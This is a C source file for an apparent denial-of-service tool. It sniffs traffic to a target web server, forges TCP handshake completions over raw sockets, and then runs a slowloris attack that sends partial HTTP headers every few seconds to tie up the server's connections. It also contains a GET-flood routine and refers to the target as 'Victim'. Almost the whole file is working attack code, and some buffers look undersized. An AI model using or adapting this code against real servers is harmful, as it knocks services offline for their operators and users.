#include "handshake.h"

struct attack_params {
        u_char *args[3];
        const u_char *a_packet;
};

void start_sniffing(char *argv[])
{
    pcap_t *descr;
    char filter[30];
    sprintf(filter, "host %s and port 80", argv[1]);
    char *dev;
    //"eth0/wlan0" using as a device I will be sniffing on
    dev = argv[3];
    char error_buffer[PCAP_ERRBUF_SIZE];

    bpf_u_int32 net;
    bpf_u_int32 mask;

    struct bpf_program filterf;

    //printf("Your pcap filter: %s\n", filter);
    printf("Opening live pcap device: %s. \n", dev);
    if((descr = pcap_open_live(dev, BUFSIZ, 1, -1, error_buffer)) == NULL)
    {
        perror("Could not open a pcap device.\n");
        exit(1);
    }

    //looking up net/mask for given dev
    pcap_lookupnet(dev, &net, &mask, error_buffer);
    //compiling filter expression
    pcap_compile(descr, &filterf, filter, 0, net);


    if(pcap_setfilter(descr, &filterf) == -1)
    {
        perror("Error setting up pcap filter.\n");
        exit(1);
    }

    //freeing a bpf program
    pcap_freecode(&filterf);

    //getting link-layer header type = 1 means Ethernet according to IEEE 802.3
    int hdr_type = pcap_datalink(descr);
    //int length = 0;

    //if(hdr_type == 1)
    //{
        //sizeof ethernet header is 14
        //length = 14;
        //int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user)
        printf("Entering pcap loop.\n");
        if(pcap_loop(descr, -1, (void *) packet_receive, (u_char *) argv) < 0)
        {
            perror("Cannot get raw packet.\n");
            exit(1);
        }
    //}
    //pcap_close(descr);
    printf("Capturing finished!\n");
    //exit(0);
}
void packet_process(struct attack_params *packet)
{

    printf("Test\n");
    printf("Received packet to/from specified host!\n");
    struct ip *ip;
    struct tcphdr *tcp;
    //u_char *ptr;

    ip = (struct ip *)(packet->a_packet + sizeof(struct ether_header));
    //printf("Size of ether_header is: %d\n", sizeof(struct ether_header));
    tcp = (struct tcphdr *)(packet->a_packet + SIZE_ETHERNET + (IP_HL(ip)*4));
    if((tcp->th_flags & TH_SYN) && (tcp->th_flags & TH_ACK)) //&& !(tcp->th_flags & TH_RST) && !(tcp->th_flags & TH_PUSH))
    {
        printf("---------------------------\n");
        printf("GOT SYN/ACK PACKET!\n");
        printf("---------------------------\n");
        printf("Packet with src IP: %s\n", inet_ntoa(ip->ip_src));
        printf("Packet with dst IP: %s\n", inet_ntoa(ip->ip_dst));
        printf("Packet's seq: %u\n", ntohl(tcp->th_seq));
        printf("Packet's ack: %u\n", ntohl(tcp->th_ack));

        u_int32_t seq_n = ntohl(tcp->th_seq);
        u_int32_t ack_n = ntohl(tcp->th_ack);

        send_syn_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, packet->args);
    }

}

int packet_receive(u_char *argv[], const struct pcap_pkthdr *pkthdr, u_char *packet)
{

    struct attack_params *packet1;
    packet1 = (struct attack_params *) malloc(sizeof(struct attack_params));

    printf("Arguments for request are: %s and %s\n", argv[2], argv[1]);
    packet1->args[0] = argv[0];
    packet1->args[1] = argv[1];
    packet1->args[2] = argv[2];
    packet1->a_packet = packet;

    printf("Arguments for request are: %s and %s\n", packet1->args[2], packet1->args[1]);
    pthread_t thread1;

    ////Creating thread with start_sniffing() function call, will start receiving packets and process them
    if(pthread_create(&thread1, NULL, (void *) packet_process, packet1) < 0)
    {
        fprintf(stderr, "Failed to create a new thread.\n");
        return 1;
    }
    pthread_detach(thread1);
    return 0;

    //printf("Received packet to/from specified host!\n");
    //struct ip *ip;
    //struct tcphdr *tcp;
    ////u_char *ptr;

    //ip = (struct ip *)(packet + sizeof(struct ether_header));
    ////printf("Size of ether_header is: %d\n", sizeof(struct ether_header));
    //tcp = (struct tcphdr *)(packet + SIZE_ETHERNET + (IP_HL(ip)*4));


    ////printf("%d\n", l1_len);
    //    //& is a binary AND
    ////if(tcp->th_flags & TH_SYN)
    ////    printf("Packet has a flags set as SYN!\n");
    ////if(tcp->th_flags & TH_ACK)
    ////    printf("Packet has a flags set as ACK!\n");
    ////if(tcp->th_flags & TH_RST)
    ////    printf("Packet has a flags set as RST!\n");
    ////if(tcp->th_flags & TH_FIN)
    ////    printf("Packet has a flags set as FIN!\n");
    ////if(tcp->th_flags & TH_PUSH)
    ////    printf("Packet has a flags set as PUSH!\n");
    //if((tcp->th_flags & TH_SYN) && (tcp->th_flags & TH_ACK)) //&& !(tcp->th_flags & TH_RST) && !(tcp->th_flags & TH_PUSH))
    //{
    //    printf("---------------------------\n");
    //    printf("GOT SYN/ACK PACKET!\n");
    //    printf("---------------------------\n");
    //    printf("Packet with src IP: %s\n", inet_ntoa(ip->ip_src));
    //    printf("Packet with dst IP: %s\n", inet_ntoa(ip->ip_dst));
    //    printf("Packet's seq: %u\n", ntohl(tcp->th_seq));
    //    printf("Packet's ack: %u\n", ntohl(tcp->th_ack));

    //    u_int32_t seq_n = ntohl(tcp->th_seq);
    //    u_int32_t ack_n = ntohl(tcp->th_ack);
    //    //printf("Sequence num is: %u\n", seq_n);
    //    send_syn_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, argv);
    //}
}

void send_syn_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
{
    printf("SEND ACK request are: %s and %s and %s\n", argv[2], argv[1], argv[0]);
    struct ip iph;
    struct tcphdr tcph;
    struct sockaddr_in dest;

    int sock_raw;

    sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    char *pkt_syn_ack;
    pkt_syn_ack = (char *) malloc(60);
    if(pkt_syn_ack == NULL)
    {
        perror("Could not allocate pkt_syn_ack mem on heap.\n");
        exit(-1);
    }


    iph.ip_hl = 5;
    iph.ip_v = 4;
    iph.ip_tos = 0;
    iph.ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph.ip_id = htons(12346);
    iph.ip_off = 0;
    iph.ip_ttl = 64;
    iph.ip_p = IPPROTO_TCP;
    iph.ip_sum = 0;
    iph.ip_src.s_addr = (u_int32_t) *source_ip;
    iph.ip_dst.s_addr = (u_int32_t) *dst_ip;
    iph.ip_sum = csum((unsigned short *) pkt_syn_ack, iph.ip_len >> 1);

    //printf("Source port in ACK message is: %u\n", source_port);
    memcpy(pkt_syn_ack, &iph, sizeof(iph));

    tcph.th_sport = htons(source_port);
    tcph.th_dport = htons(80);
    tcph.th_seq = htonl(ack);
    tcph.th_ack = htonl(seq + 1);
    tcph.th_x2 = 0;
    tcph.th_off = sizeof(struct tcphdr) / 4;
    tcph.th_flags = TH_ACK;
    tcph.th_win = htons(29200);
    tcph.th_sum = 0;
    tcph.th_urp = 0;
    tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, sizeof(tcph));

    memcpy(pkt_syn_ack + sizeof(iph), &tcph, sizeof(tcph));

    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = iph.ip_dst.s_addr;

    int one = 1;

    //IP_HDRINCL tells the kernel that headers are included
    if(setsockopt(sock_raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
    {
        fprintf(stderr, "Error setting up setsockopt!\n");
        exit(1);
    }

    if(sendto(sock_raw, pkt_syn_ack, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
    {
        perror("Failed to send syn_ack packet!\n");
        exit(1);
    }

    free(pkt_syn_ack);
    slowloris(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
    //get_flood(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
}

void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
{
    printf("Arguments for GET request are: %s and %s and %s\n", argv[2], argv[1], argv[0]);
    struct ip iph;
    struct tcphdr tcph;
    struct sockaddr_in dest;

    //printf("Victim: %s\n", argv[1]);
    char *pkt_data;
    pkt_data = (char *) malloc(60);
    if(pkt_data == NULL)
    {
        perror("Could not allocate pkt_data mem on heap.\n");
        exit(-1);
    }

    uint8_t *packet;
    packet = malloc(sizeof(u_int8_t));
    if(packet == NULL)
    {
        perror("Could not allocate packet mem on heap.\n");
        exit(-1);
    }

    sprintf(pkt_data, "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n", argv[2], argv[1]);

    u_int32_t pkt_data_len = strlen(pkt_data);

    iph.ip_hl = 5;
    iph.ip_v = 4;
    iph.ip_tos = 0;
    iph.ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + pkt_data_len);
    iph.ip_id = htons(12348);
    iph.ip_off = 0;
    iph.ip_ttl = 64;
    iph.ip_p = IPPROTO_TCP;
    iph.ip_sum = 0;
    iph.ip_src.s_addr = *source_ip;
    iph.ip_dst.s_addr = *dst_ip;
    iph.ip_sum = csum((unsigned short *) pkt_data, iph.ip_len >> 1);

    memcpy(packet, &iph, sizeof(iph));
    //printf("TCP segments length: %u\n", pkt_data_len);

    tcph.th_sport = htons(source_port);
    tcph.th_dport = htons(80);
    tcph.th_seq = htonl(seq);
    tcph.th_ack = htonl(ack);
    tcph.th_x2 = 0;
    tcph.th_off = sizeof(struct tcphdr) / 4;
    tcph.th_flags = TH_ACK;
    tcph.th_win = htons(29200);
    tcph.th_sum = 0;
    tcph.th_urp = 0;
    //tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, 20 + 20 + pkt_data_len);
    tcph.th_sum = tcp_chksum(iph, tcph, (u_int8_t *)pkt_data, pkt_data_len);

    memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));
    memcpy(packet + sizeof(iph) + sizeof(tcph), pkt_data, pkt_data_len * sizeof(uint8_t));

    //tcph.th_sum = csum((unsigned short *) packet, iph.ip_len >> 1);
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = iph.ip_dst.s_addr;

    if(sendto(*sock_raw, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + pkt_data_len, 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
    {
        perror("Failed to send HTTP Get request packet!\n");
        exit(1);
    }

    sprintf(pkt_data, "X-a: b\r\n");

    u_int32_t pkt_data_len2 = strlen(pkt_data);

    for(int i = 0; i < 99999; i++)
    {
        iph.ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + pkt_data_len2);
        iph.ip_id = htons(12348);
        iph.ip_sum = 0;
        iph.ip_sum = csum((unsigned short *) pkt_data, iph.ip_len >> 1);

        memcpy(packet, &iph, sizeof(iph));

        //Seq number has to be incremented according to previous packets data length
        tcph.th_seq = htonl(seq + pkt_data_len + (i*pkt_data_len2));
        tcph.th_ack = htonl(ack);
        tcph.th_flags = TH_ACK;
        tcph.th_win = htons(29200);
        tcph.th_sum = 0;
        tcph.th_sum = tcp_chksum(iph, tcph, (u_int8_t *)pkt_data, pkt_data_len2);

        memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));

        //Seq numbers has to be changed for every packet!
        memcpy(packet + sizeof(iph) + sizeof(tcph), pkt_data, pkt_data_len2 * sizeof(u_int8_t));

        sleep(10);
        printf("Sending Keep-Alive packet from thread: %lu.\n", pthread_self());
        if(sendto(*sock_raw, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + pkt_data_len2, 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
        {
            perror("Failed to send keepalive packet!\n");
            exit(1);
        }
        sleep(10);

    }
    free(pkt_data);
    free(packet);
    pthread_exit(0);

}

void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
{
    struct ip iph;
    struct tcphdr tcph;
    struct sockaddr_in dest;

    printf("Victim: %s\n", argv[1]);
    char *pkt_data;
    pkt_data = (char *) malloc(60);
    if(pkt_data == NULL)
    {
        perror("Could not allocate pkt_data mem on heap.\n");
        exit(-1);
    }


    uint8_t *packet;
    packet = malloc(sizeof(u_int8_t));
    if(packet == NULL)
    {
        perror("Could not allocate packet mem on heap.\n");
        exit(-1);
    }


    sprintf(pkt_data, "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", argv[2], argv[1]);

    int pkt_data_len = strlen(pkt_data);

    iph.ip_hl = 5;
    iph.ip_v = 4;
    iph.ip_tos = 0;
    iph.ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + pkt_data_len);
    iph.ip_id = htons(12348);
    iph.ip_off = 0;
    iph.ip_ttl = 64;
    iph.ip_p = IPPROTO_TCP;
    iph.ip_sum = 0;
    iph.ip_src.s_addr = *source_ip;
    iph.ip_dst.s_addr = *dst_ip;
    iph.ip_sum = csum((unsigned short *) pkt_data, iph.ip_len >> 1);

    memcpy(packet, &iph, sizeof(iph));

    tcph.th_sport = htons(source_port);
    tcph.th_dport = htons(80);
    tcph.th_seq = htonl(seq);
    tcph.th_ack = htonl(ack);
    tcph.th_x2 = 0;
    tcph.th_off = sizeof(struct tcphdr) / 4;
    tcph.th_flags = TH_ACK;
    tcph.th_win = htons(29200);
    tcph.th_sum = 0;
    tcph.th_urp = 0;
    //tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, 20 + 20 + pkt_data_len);
    tcph.th_sum = tcp_chksum(iph, tcph, (u_int8_t *)pkt_data, pkt_data_len);

    memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));
    memcpy(packet + sizeof(iph) + sizeof(tcph), pkt_data, pkt_data_len * sizeof(uint8_t));

    //tcph.th_sum = csum((unsigned short *) packet, iph.ip_len >> 1);
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = iph.ip_dst.s_addr;

    for(int i = 0; i < 10; i++)
    {
        if(sendto(*sock_raw, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + pkt_data_len, 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
        {
            perror("Failed to send HTTP Get request packet!\n");
            exit(1);
        }
        sleep(5);
    }
    free(pkt_data);
    free(packet);

}

/*int send_syn(int sock_raw, char *source_ip, struct in_addr dst_ip, u_int16_t *source_port, char *argv[])
{
//IP header
    struct ip iph;
    struct tcphdr tcph;
    struct sockaddr_in dest;

    char *packet_to_send;
    packet_to_send = (char *)malloc(60);
    if(packet_to_send == NULL)
    {
        perror("Could not allocate packet_to_send mem on heap.\n");
        exit(-1);
    }
    //Zero out the packet memory area
    //memset(packet_to_send, 0, 4096);
    //Fill in the IP header
    iph.ip_hl = 5;
    iph.ip_v = 4;
    iph.ip_tos = 0;
    iph.ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph.ip_id = htons(12345);
    iph.ip_off = 0;
    iph.ip_ttl = 64;
    iph.ip_p = IPPROTO_TCP;
    iph.ip_sum = 0; //Will be calculated afterwards
    iph.ip_src.s_addr = inet_addr(source_ip);
    iph.ip_dst.s_addr = dst_ip.s_addr;

    //Function that calculates checksum is implemented in trafgen
    iph.ip_sum = csum((unsigned short *) packet_to_send, iph.ip_len >> 1);

    memcpy(packet_to_send, &iph, sizeof(iph));

    //Fill in the TCP header
    tcph.th_sport = htons(*source_port);
    tcph.th_dport = htons(80);
    tcph.th_seq = htonl(0);
    tcph.th_ack = htonl(0);
    tcph.th_x2 = 0;
    tcph.th_off = sizeof(struct tcphdr) / 4;
    tcph.th_flags = TH_SYN;
    tcph.th_win = htons(29200);
    tcph.th_sum = 0;
    tcph.th_urp = 0;
    tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, sizeof(tcph));

    memcpy((packet_to_send + sizeof(iph)), &tcph, sizeof(tcph));

    int one = 1;

    //IP_HDRINCL tells the kernel that headers are included
    if(setsockopt(sock_raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
    {
        fprintf(stderr, "Error setting up setsockopt!\n");
        return 1;
    }

    printf("Starting sniffing.\n");
    pthread_t thread1;

    //Creating thread with start_sniffing() function call, will start receiving packets and process them
    if(pthread_create(&thread1, NULL, (void *)start_sniffing, argv) < 0)
    {
        fprintf(stderr, "Failed to create a new thread.\n");
        return 1;
    }
    sleep(1);

    printf("Starting to send packets.\n");

    //dest - sockaddr_in
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = iph.ip_dst.s_addr;

    //Send the packet out
    if(sendto(sock_raw, packet_to_send, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
    {
        fprintf(stderr, "Error sending syn packet! Error message: %s\n", strerror(errno));
        exit(1);
    }
    free(packet_to_send);
    return 0;
}*/
